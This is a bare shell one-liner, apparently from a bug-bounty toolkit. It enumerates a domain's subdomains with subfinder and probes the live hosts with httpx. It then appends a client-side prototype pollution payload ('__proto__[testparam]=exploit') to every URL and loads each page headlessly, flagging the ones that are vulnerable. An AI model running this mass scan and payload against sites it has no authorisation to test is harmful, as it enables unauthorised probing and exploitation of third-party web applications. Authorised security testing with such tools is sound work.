subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q 
FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-
fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]" '
| sed "s/(//g" | sed "s/)//g"  | sed "s/JS //g" | grep "VULNERABLE"
